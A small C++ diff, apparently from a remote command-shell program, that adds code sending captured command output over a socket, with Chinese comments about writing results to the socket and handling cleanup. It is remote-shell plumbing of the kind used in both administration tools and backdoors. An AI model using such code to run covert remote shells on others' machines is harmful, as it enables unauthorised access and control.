@@ -131,6 +131,12 @@ void Shell::flushResults() {
 			break;
 		}
 
+		// 读完了就写到socket
+		if (!gSock.sendData(szResult, dwBytesResult)) {
+			OutputDebugStringA("cannot write socket and stop shell\r\n");
+			break;
+		}
+
 	} while (false);
 
 	// 这里在斟酌怎么合理地安排处理后事
